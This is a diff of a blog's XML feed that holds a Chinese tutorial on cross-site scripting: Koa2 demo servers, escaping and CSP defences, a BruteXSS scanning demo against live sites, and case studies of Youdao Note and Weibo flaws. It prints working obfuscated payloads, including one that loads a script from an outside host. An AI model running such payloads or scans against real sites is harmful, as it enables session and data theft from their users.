+<p>总体来说，我们能做的只是降低 XSS 攻击的风险，XSS 的攻防战一直存在也十分复杂。最后给一下<a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a>，祝大家看得开心（溜了～</p>
+<h2 id="实战-amp-amp-案例"><a href="#实战-amp-amp-案例" class="headerlink" title="实战 &amp;&amp; 案例"></a>实战 &amp;&amp; 案例</h2><p>是否你会存在这样的侥幸心理，看完上文后觉得只要进行转义就行了，是的，其实只要进行转义就行了，问题就是从<a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a>看出，过滤规则表还是蛮多的。我们来简单的实战一下。</p>
+<p>XSS 检测工具有很多，有<strong>BruteXSS</strong>，<strong>XSSer</strong>，<strong>Beef-XSS</strong>等等，可以说靠自己在本地扫描自己本地项目是否存在 XSS 漏洞了。我们在这里用<strong>BruteXSS</strong>来演示一下，<strong>仅做学习，切勿犯法。</strong></p>
+<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><blockquote>
+<p>BruteXSS 是一个根据暴力注入参数的跨站点脚本检测工具，不仅仅支持 GET 请求，还支持 POST 请求。它能从指定的词库中夹在多种 payload 进行注入，并且使用指定的 payload 和扫描检查这些存在的 XSS 漏洞的参数。</p>
+</blockquote>
+<p>我们从 github 下载<a href="https://github.com/Bosco-Lam/BruteXss" target="_blank" rel="noopener">BruteXSS</a>，之所以下载这个是因为它有 wordlist-huge.txt，也就是我们所说的 payload 词库，它约有5000条 payload 脚本。接着我们还需要安装 Python 2.7，<code>pip install colorama</code> 和 <code>pip install Mechanize</code>。</p>
+<p>执行 <code>python brutexss.py</code>，正常情况下会出现以下界面：</p>
+<p><img src="/images/http/xss-04.jpg" alt=""></p>
+<p>接着，搓搓期待的小手，我们可以到处学(sa)习(ye)了。找了好久好不容易才找到一个，于是我们就开始行动，具体的操作在这里就不讲解了，因为一步一步看操作，很简单。我们找的是使用 <code>GET</code> 方法，这类漏洞比较好找，只要对方有输入框即可(现在的浏览器以及网站多多少少都会防御部分XSS，所以不太好找)。</p>
+<p><img src="/images/http/xss-05.png" alt=""></p>
+<p>可以看到参数 <code>q</code> 有一个遗漏的注入点，于是我们就来试试看，是否真的成效。</p>
+<p><img src="/images/http/xss-06.png" alt=""></p>
+<p>(,,#ﾟДﾟ)，没想到居然成了，我试了好多几乎都被后台拦截了，这个居然成了(,,#ﾟДﾟ)。可以看出通过 payload 给出的攻击脚本能顺利的弹出 <code>1</code> 这个框。这个就是典型的<strong>反射型 XSS 攻击。</strong></p>
+<p>除此之外，我们还可以利用该工具在一些破破烂烂的边缘网站发帖来实现<strong>存储型 XSS攻击</strong>。但是这个工具也只是辅助工具，并不代表通过该工具扫描不出的就无漏洞，更多攻击者靠的可是<strong>技术以及经验。</strong></p>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><blockquote>
+<p><a href="http://www.wooyun.org" target="_blank" rel="noopener">乌云</a>不在的第三个年头，想它。 ———— 鲁迅</p>
+</blockquote>
+<p>不仅仅是破破烂烂的边缘小网站，也有大公司也存在过 XSS 攻击的案例。</p>
+<h4 id="案例1-有道云笔记分享出现-XSS-攻击漏洞"><a href="#案例1-有道云笔记分享出现-XSS-攻击漏洞" class="headerlink" title="案例1 有道云笔记分享出现 XSS 攻击漏洞"></a>案例1 有道云笔记分享出现 XSS 攻击漏洞</h4><ol>
+<li>编辑完有道云笔记后保存然后通过<strong>Fiddler</strong>或<strong>Charles</strong>进行抓包；</li>
+<li>由于有道云在对 <code>iframe</code> 的 <code>srcdoc</code> 没做处理，因此可以利用这个弱点来进行注入 payload，然后分享给别人，payload 如下；</li>
+<li>修复的方法也很简单，就是对其针对 <code>iframe</code> 的 <code>srcdoc</code> 加强过滤就行了；</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#&lt;iframe class=&amp;quot;&amp;#x7a;&amp;#x68;&amp;#x6f;&amp;#x75;zhou&amp;quot; src='javAscript:confirm(1111)'/1111111wooyun/)"');' href=`vBscript:msgbox('"');` srcdoc='vBscr&amp;#x3c;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x6f;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6e;&amp;#x29;&amp;#x3b;&amp;#x3c;&amp;#x2f;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;ipt:msgbox('"');' alt=`</span><br><span class="line"></span><br><span class="line"><span class="string">` yuyangzhou="&lt;iframe" onclick=eval('&lt;script&gt;alert(/martinzhou/)&lt;/script&gt;'); style=&amp;quot;font-family:e/* &amp;#*/x/*&amp;#x0000000022;*/p/*&amp;gt;*/r/*onkeydown=*/ession(confirm(5));"iframe&gt;zhou&amp;quot;&gt;5&lt;/iframe&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">`&lt;div class=" \\'" src=&amp;nbsp;javAscript:confirm('1"');&amp;nbsp; href=`</span>data:q;base64,PHNjcmlwdD5hbGVydCgnQHFhYicpPC9zY3JpcHQ+<span class="string">` srcdoc= javAscript:confirm('1"');  alt="zhou" yuyangzhou=`</span><span class="string">`&lt;div/onmouseover=prompt(1)`</span> onload=alert(<span class="string">'1"'</span>); style=&amp;nbsp;font-family:e<span class="comment">/*;/*/</span>x<span class="comment">/*&amp;#34;*/</span>p<span class="comment">/*&amp;quot;*/</span>r<span class="comment">/*onclick=*/</span>ession(confirm(<span class="number">0</span>));<span class="string">""</span><span class="string">`&lt;div/onmouseover=prompt(1)&amp;nbsp;&gt;0&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="案例2-新浪微博反射型-XSS"><a href="#案例2-新浪微博反射型-XSS" class="headerlink" title="案例2 新浪微博反射型 XSS"></a>案例2 新浪微博反射型 XSS</h4><ol>
+<li>在新浪微博某个分享页，有这样的一个接口<code>http://book.weibo.com/newcms/i/weibo_send.php</code>；</li>
+<li><p>当错误时返回的数据结构为如下；</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 也就是说这个接口会校验`error.referer`</span></span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="number">-1</span>,<span class="string">"message"</span>:<span class="string">"\u8bf7\u6c42\u6e90\u4e0d\u5141\u8bb8[http:\/\/error.referer]"</span>&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当<code>error.referer</code>返回来后页面的响应报文为<code>Content-Type: text/html; charset=utf-8</code>，既然错误后的<code>Content-Type</code>为<code>text/html</code>，那么我们就可以在此做文章；</p>
+</li>
+<li>虽然在 Chrome 和 Firefox 下，referrer 都会被进行 url encode导致无法插入HTML标签。<strong>但是该问题，可以在 IE 进行 XSS 攻击；</strong></li>
+<li><p>我们在自己的服务器做一些处理，向我们服务器发起请求，即在浏览器地址栏输入如下 URL；</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// e=document.createElement("script");e.src="http://a.xxx.xyz/book.weibo.js",document.documentElement.appendChild(e)</span></span><br><span class="line"><span class="comment">// 将上面的转换为 char code 的形式</span></span><br><span class="line"><span class="comment">// 完整 URL 如下</span></span><br><span class="line">http:<span class="comment">//a.xxx.xyz/?a=&lt;img src=1 onerror=eval(String.fromCharCode(101,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,101,46,115,114,99,61,34,104,116,116,112,58,47,47,97,46,122,104,99,104,98,105,110,46,120,121,122,47,98,111,111,107,46,119,101,105,98,111,46,106,115,34,44,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,97,112,112,101,110,100,67,104,105,108,100,40,101,41))&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>请求后我们的服务器会重定向跳转到<code>http://book.weibo.com/newcms/i/weibo_send.php</code>，这时候的 <code>error.referer</code> 就会被我们植入 XSS 攻击脚本了。</p>
+</li>
+</ol>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>可以看到，大多数漏洞都是处于绕来绕去最后发现漏洞的地方没有进行过滤转义处理。正所谓 <strong>攻击千万条，安全第一条。过滤不规范，开发两行泪。</strong></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">跨站脚本 - 维基百科，自由的百科全书</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting" target="_blank" rel="noopener">跨站脚本攻击(Cross-site scripting) - 术语表 | MDN</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">内容安全策略( CSP ) - HTTP | MDN</a></li>
+<li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS" target="_blank" rel="noopener">Cross-site Scripting (XSS)</a>)</li>
 </ul>
 ]]></content>
       
@@ -765,127 +973,6 @@
         <tags>
             
             <tag> http </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Web 安全防御战 - 浅谈XSS]]></title>
-      <url>https://lucius0.github.io/2019/06/30/archivers/web-secure-xss/</url>
-      <content type="html"><![CDATA[<p>在进入 web 安全知识之前，建议对 HTTP 有所了解，可以看<a href="https://lucius0.github.io/2019/06/30/archivers/http-introduction/">HTTP 入门体检</a>，会对以下的内容有所帮助。</p>
-<h2 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS(Cross Site Scripting)"></a>XSS(Cross Site Scripting)</h2><blockquote>
-<p>XSS，跨站脚本攻击。很常见的一种攻击方式，主要是通过<strong>脚本注入</strong>的方式进行攻击用户。通常有：反射型 XSS 、存储型 XSS和 DOM 型 XSS。——<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">跨站脚本 - 维基百科</a></p>
-</blockquote>
-<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><blockquote>
-<p>反射型 XSS，为非持久型，可以把它想象成反射弧。从发起带有XSS脚本的请求，提交到服务端，服务端解析后响应随之返回浏览器，最后浏览器将其响应解析并执行。简单来说，一般都是由 URI 参数直接注入的攻击。</p>
-</blockquote>
-<p>我们用 Koa2 来模拟一下，以下是简单的示例代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Document&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    #&#123;root&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  ctx.body = template.replace(<span class="string">'#&#123;root&#125;'</span>, <span class="string">`welcome: `</span> + ctx.query.xss);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure></p>
-<p>在下面我们可以看到，浏览器会报错，原因是现代浏览器都会有 XSS 拦截的保护机制(这并不代表因为浏览器帮我们做了而我们就可以忽略 XSS 的知识)。</p>
-<p><img src="/images/http/xss-01.gif" alt=""></p>
-<p>因此我们需要在服务器设置响应首部<code>X-XSS-Protection</code>。由于我们是要模拟 XSS ，所以我们先关闭 XSS 的保护 <code>ctx.set(&#39;X-XSS-Protection&#39;, 0)</code>，然后就可以看到以下结果，弹出 alert 弹窗。</p>
-<p><img src="/images/http/xss-02.gif" alt=""></p>
-<p>除了上面直接执行脚本之外，还可以加载非同源的js文件，嵌入 iframe 页面等等。</p>
-<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><blockquote>
-<p> 存储型 XSS，为持久型。跟反射型 XSS 的唯一区别在于是否会保存在服务器，如数据库，内存等。而当别人访问该页面时，就会受到 XSS 代码的攻击。危害相比反射型更加严重，也更隐匿。</p>
-</blockquote>
-<p>我们再次用Koa2来模拟一下，以下是简单的示例代码：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Document&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    #&#123;root&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟数据库</span></span><br><span class="line"><span class="keyword">const</span> database = &#123;</span><br><span class="line">  message: <span class="string">''</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> url = ctx.request.url;</span><br><span class="line">  <span class="keyword">if</span> (url.indexOf(<span class="string">'/blog'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    database.message = ctx.query.message;</span><br><span class="line">    ctx.body = <span class="string">'发送成功～'</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ctx.set(<span class="string">'X-XSS-Protection'</span>, <span class="number">0</span>);</span><br><span class="line">    ctx.body = template.replace(<span class="string">'#&#123;root&#125;'</span>, <span class="string">`来自某某人的消息：`</span> + database.message);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
-<p>大概的步骤是模拟类博客那种，黑客利用漏洞向网站发送带有 XSS 攻击脚本到服务器，服务器没有任何的安全校验直接保存到数据库 <code>database</code>，当其他用户访问带有该 XSS 脚本的页面时就被攻击了。在这里我们发送一个带用 iframe 劫持的请求到服务器，用户收到响应时就会返回该 iframe 页面。</p>
-<p><img src="/images/http/xss-03.gif" alt=""></p>
-<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><blockquote>
-<p>DOM 型 XSS，为非持久型，主要是利用前端的代码逻辑漏洞，攻击者植入恶意代码，然后浏览器解析恶意代码后执行造成的 XSS 攻击。</p>
-</blockquote>
-<p>以下是简单的示例代码：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  DOM 型 XSS</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="string">'alert(1)'</span>);</span></span><br><span class="line"><span class="javascript">  setInterval(<span class="string">'alert(2)'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="built_in">eval</span>(<span class="string">'alert(3)'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="常见-XSS-注入点"><a href="#常见-XSS-注入点" class="headerlink" title="常见 XSS 注入点"></a>常见 XSS 注入点</h3><ul>
-<li>HTML 节点内容，例如动态生成，里面包含用户输入信息，那么有可能会携带脚本；</li>
-<li>HTML 节点属性，例如图片的 onerror、onclick 事件；超链接 href、输入框 value 属性；</li>
-<li>JavaScript 代码，例如 JS 代码中存在后台注入的变量或如 react 的 dangerouslySetInnerHTML；</li>
-<li>富文本，例如富文本需要过滤需要正常展示的 html 代码之外的脚本；</li>
-</ul>
-<h3 id="常见危害"><a href="#常见危害" class="headerlink" title="常见危害"></a>常见危害</h3><ul>
-<li>获取页面数据；</li>
-<li>盗取 Cookie，获取敏感信息；</li>
-<li>劫持前端逻辑；</li>
-<li>伪装身份，利用可信任来进行不允许的操作；</li>
-<li>进行 DDoS 攻击；</li>
-<li>……</li>
-</ul>
-<h3 id="常见防御方法"><a href="#常见防御方法" class="headerlink" title="常见防御方法"></a>常见防御方法</h3><ul>
-<li>浏览器自带防御，如我们上面提到的，假如在服务器不设置<code>X-XSS-Protection</code>，现代浏览器也一样会为我们拦截大部分的 XSS 攻击(<strong>反射型 XSS，而且只会拦截出现在 HTML 内容或属性中，同时也并不是所有浏览器都支持</strong>)；</li>
-<li>节点内容转义，一般会在入数据库之前转义或者在展示的时候转义，但是入库之前转义需要<strong>注意的是，1、客户端不仅仅只有Web端，也有iOS等终端，所以可能会导致出现乱码；2、转义后的字符串跟长度跟预期的字符串长度发生变化，如’&lt;‘ 转成 ‘&lt;’，由1个字符变成了4个字符</strong>；</li>
-</ul>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 展示转义简单处理</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#x27;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2F;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>JavaScript 内容转义，同理节点内容转义，但是处理方法稍微不同，可以使用<code>JSON.stringify</code>来处理；</li>
-<li>Angular / Vue / React，不建议使用 <code>[innerHTML]/v-html/dangerouslySetInnerHTML</code> 来插入 html 元素；</li>
-<li><code>eval()/setTimeout()/setInterval()</code>，都是可以直接将字符串当代码段运行；</li>
-<li>富文本内容转义，相对于节点内容转义跟 JavaScript 内容转义，富文本内容转义比较复杂，但是大多数处理的思路都是相同的，设置转义白名单，对用户输入的内容进行过滤，可以使用 <code>js-xss</code> 库；</li>
-<li>CSP(Content-Security-Policy)，可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">内容安全策略( CSP ) - HTTP | MDN</a>，后续会说明下CSP策略；</li>
-</ul>
-<p>总体来说，我们能做的只是降低 XSS 攻击的风险，XSS 的攻防战一直存在也十分复杂。最后给一下<a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a>，祝大家看得开心（溜了～</p>
-<h2 id="实战-amp-amp-案例"><a href="#实战-amp-amp-案例" class="headerlink" title="实战 &amp;&amp; 案例"></a>实战 &amp;&amp; 案例</h2><p>是否你会存在这样的侥幸心理，看完上文后觉得只要进行转义就行了，是的，其实只要进行转义就行了，问题就是从<a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a>看出，过滤规则表还是蛮多的。我们来简单的实战一下。</p>
-<p>XSS 检测工具有很多，有<strong>BruteXSS</strong>，<strong>XSSer</strong>，<strong>Beef-XSS</strong>等等，可以说靠自己在本地扫描自己本地项目是否存在 XSS 漏洞了。我们在这里用<strong>BruteXSS</strong>来演示一下，<strong>仅做学习，切勿犯法。</strong></p>
-<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><blockquote>
-<p>BruteXSS 是一个根据暴力注入参数的跨站点脚本检测工具，不仅仅支持 GET 请求，还支持 POST 请求。它能从指定的词库中夹在多种 payload 进行注入，并且使用指定的 payload 和扫描检查这些存在的 XSS 漏洞的参数。</p>
-</blockquote>
-<p>我们从 github 下载<a href="https://github.com/Bosco-Lam/BruteXss" target="_blank" rel="noopener">BruteXSS</a>，之所以下载这个是因为它有 wordlist-huge.txt，也就是我们所说的 payload 词库，它约有5000条 payload 脚本。接着我们还需要安装 Python 2.7，<code>pip install colorama</code> 和 <code>pip install Mechanize</code>。</p>
-<p>执行 <code>python brutexss.py</code>，正常情况下会出现以下界面：</p>
-<p><img src="/images/http/xss-04.jpg" alt=""></p>
-<p>接着，搓搓期待的小手，我们可以到处学(sa)习(ye)了。找了好久好不容易才找到一个，于是我们就开始行动，具体的操作在这里就不讲解了，因为一步一步看操作，很简单。我们找的是使用 <code>GET</code> 方法，这类漏洞比较好找，只要对方有输入框即可(现在的浏览器以及网站多多少少都会防御部分XSS，所以不太好找)。</p>
-<p><img src="/images/http/xss-05.png" alt=""></p>
-<p>可以看到参数 <code>q</code> 有一个遗漏的注入点，于是我们就来试试看，是否真的成效。</p>
-<p><img src="/images/http/xss-06.png" alt=""></p>
-<p>(,,#ﾟДﾟ)，没想到居然成了，我试了好多几乎都被后台拦截了，这个居然成了(,,#ﾟДﾟ)。可以看出通过 payload 给出的攻击脚本能顺利的弹出 <code>1</code> 这个框。这个就是典型的<strong>反射型 XSS 攻击。</strong></p>
-<p>除此之外，我们还可以利用该工具在一些破破烂烂的边缘网站发帖来实现<strong>存储型 XSS攻击</strong>。但是这个工具也只是辅助工具，并不代表通过该工具扫描不出的就无漏洞，更多攻击者靠的可是<strong>技术以及经验。</strong></p>
-<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><blockquote>
-<p><a href="http://www.wooyun.org" target="_blank" rel="noopener">乌云</a>不在的第三个年头，想它。 ———— 鲁迅</p>
-</blockquote>
-<p>不仅仅是破破烂烂的边缘小网站，也有大公司也存在过 XSS 攻击的案例。</p>
-<h4 id="案例1-有道云笔记分享出现-XSS-攻击漏洞"><a href="#案例1-有道云笔记分享出现-XSS-攻击漏洞" class="headerlink" title="案例1 有道云笔记分享出现 XSS 攻击漏洞"></a>案例1 有道云笔记分享出现 XSS 攻击漏洞</h4><ol>
-<li>编辑完有道云笔记后保存然后通过<strong>Fiddler</strong>或<strong>Charles</strong>进行抓包；</li>
-<li>由于有道云在对 <code>iframe</code> 的 <code>srcdoc</code> 没做处理，因此可以利用这个弱点来进行注入 payload，然后分享给别人，payload 如下；</li>
-<li>修复的方法也很简单，就是对其针对 <code>iframe</code> 的 <code>srcdoc</code> 加强过滤就行了；</li>
-</ol>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#&lt;iframe class=&amp;quot;&amp;#x7a;&amp;#x68;&amp;#x6f;&amp;#x75;zhou&amp;quot; src='javAscript:confirm(1111)'/1111111wooyun/)"');' href=`vBscript:msgbox('"');` srcdoc='vBscr&amp;#x3c;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x6f;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6e;&amp;#x29;&amp;#x3b;&amp;#x3c;&amp;#x2f;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;ipt:msgbox('"');' alt=`</span><br><span class="line"></span><br><span class="line"><span class="string">` yuyangzhou="&lt;iframe" onclick=eval('&lt;script&gt;alert(/martinzhou/)&lt;/script&gt;'); style=&amp;quot;font-family:e/* &amp;#*/x/*&amp;#x0000000022;*/p/*&amp;gt;*/r/*onkeydown=*/ession(confirm(5));"iframe&gt;zhou&amp;quot;&gt;5&lt;/iframe&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">`&lt;div class=" \\'" src=&amp;nbsp;javAscript:confirm('1"');&amp;nbsp; href=`</span>data:q;base64,PHNjcmlwdD5hbGVydCgnQHFhYicpPC9zY3JpcHQ+<span class="string">` srcdoc= javAscript:confirm('1"');  alt="zhou" yuyangzhou=`</span><span class="string">`&lt;div/onmouseover=prompt(1)`</span> onload=alert(<span class="string">'1"'</span>); style=&amp;nbsp;font-family:e<span class="comment">/*;/*/</span>x<span class="comment">/*&amp;#34;*/</span>p<span class="comment">/*&amp;quot;*/</span>r<span class="comment">/*onclick=*/</span>ession(confirm(<span class="number">0</span>));<span class="string">""</span><span class="string">`&lt;div/onmouseover=prompt(1)&amp;nbsp;&gt;0&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="案例2-新浪微博反射型-XSS"><a href="#案例2-新浪微博反射型-XSS" class="headerlink" title="案例2 新浪微博反射型 XSS"></a>案例2 新浪微博反射型 XSS</h4><ol>
-<li>在新浪微博某个分享页，有这样的一个接口<code>http://book.weibo.com/newcms/i/weibo_send.php</code>；</li>
-<li><p>当错误时返回的数据结构为如下；</p>
